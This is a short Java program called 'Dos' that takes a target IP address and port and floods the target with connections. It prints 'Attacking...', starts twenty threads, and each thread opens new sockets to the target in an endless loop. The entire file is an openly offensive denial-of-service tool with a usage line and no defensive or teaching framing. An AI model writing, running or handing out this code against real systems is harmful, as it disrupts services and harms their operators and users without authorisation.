//usage : Dos <IPAddress> <Port>
import java.io.*;
import java.net.*;
class Dos{
	public static void main(String arg[]){
        if(arg.length<2){
            System.out.println("usage : Dos <IPAddress> <Port>");
            return;
        }
		try{
			if(new Socket(arg[0],Integer.parseInt(arg[1]))!=null){
				System.out.println("Attacking...");
				for(int i=0;i<20;i++){
					new Thread(){
						public void run(){
							for(;;){
								try{
									new Socket(arg[0],Integer.parseInt(arg[1])); 
								}catch(Exception e){System.out.println(e);}
							}
						}
					}.start();
				}
			}
			else
				System.out.println("Attack Failed!");
		}catch(Exception e){System.out.println(e);}
	}
}
